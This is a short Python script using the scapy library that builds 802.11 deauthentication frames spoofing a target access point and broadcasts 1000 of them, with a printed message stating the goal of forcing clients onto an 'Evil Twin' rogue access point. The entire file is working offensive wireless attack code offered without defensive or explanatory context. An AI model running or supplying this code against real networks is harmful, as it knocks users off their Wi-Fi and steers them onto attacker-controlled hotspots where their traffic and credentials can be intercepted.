from scapy.all import *

def deauth_attack(iface, target_bssid):
    client_mac = "ff:ff:ff:ff:ff:ff"  # broadcast

    deauth = RadioTap()/Dot11(addr1=client_mac, addr2=target_bssid, addr3=target_bssid)/Dot11Deauth(reason=7)

    print("[*] Sending deauth packets to force clients onto Evil Twin")
    sendp(deauth, iface=iface, inter=0.1, count=1000)